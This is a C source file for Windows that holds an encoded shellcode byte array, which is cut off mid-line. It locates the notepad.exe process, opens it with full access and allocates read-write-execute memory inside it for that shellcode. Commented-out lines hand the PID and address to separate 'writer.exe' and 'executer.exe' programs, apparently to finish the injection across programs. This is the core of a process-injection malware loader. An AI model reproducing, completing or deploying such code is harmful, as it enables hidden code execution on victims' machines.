#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <unistd.h>

unsigned char shellcode[] =
"\x4d\x31\xdb\x54\x5d\xdd\xc7\x66\x81\xe5\x10\xf9\x48\x0f"
"\xae\x45\x00\x41\xb3\x40\x49\xbd\x85\x0e\x3b\xfd\xdb\x1c"
"\xd7\x2f\x48\x8b\x55\x08\x49\xff\xcb\x4e\x31\x6c\xda\x2a"
"\xdf\x9f\x06\x43\x46\xbe\x0b\xae\xa8\x96\xd0\x62\x56\x51"
"\xfd\x82\x55\x10\xed\x75\xbb\x99\xab\x24\xc9\x9c\xd2"; /...


DWORD FindNotepadPID() {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (strcmp(processEntry.szExeFile, "notepad.exe") == 0) {
                pid = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return pid;
}

int main() {
    DWORD pid = FindNotepadPID();
    if (pid == 0) {
        printf("Notepad not found!\n");
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("Failed to open process! Error: %d\n", GetLastError());
        return 1;
    }

    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMemory == NULL) {
        printf("Failed to allocate memory! Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    printf("PID: %d\n", pid);
    printf("Allocated memory at address: 0x%p\n", remoteMemory);
    
    //char command[256];
    //sleep(2);
    //snprintf(command, sizeof(command), "writer.exe %d %p", pid ,remoteMemory);
    //printf("exec: %s\n", command);
    //system(command);
    //sleep(2);
    //snprintf(command, sizeof(command), "executer.exe %d %p", pid ,remoteMemory);
    //printf("exec: %s\n", command);
    //system(command);
    getchar();
    
    CloseHandle(hProcess);    
    return 0;
}

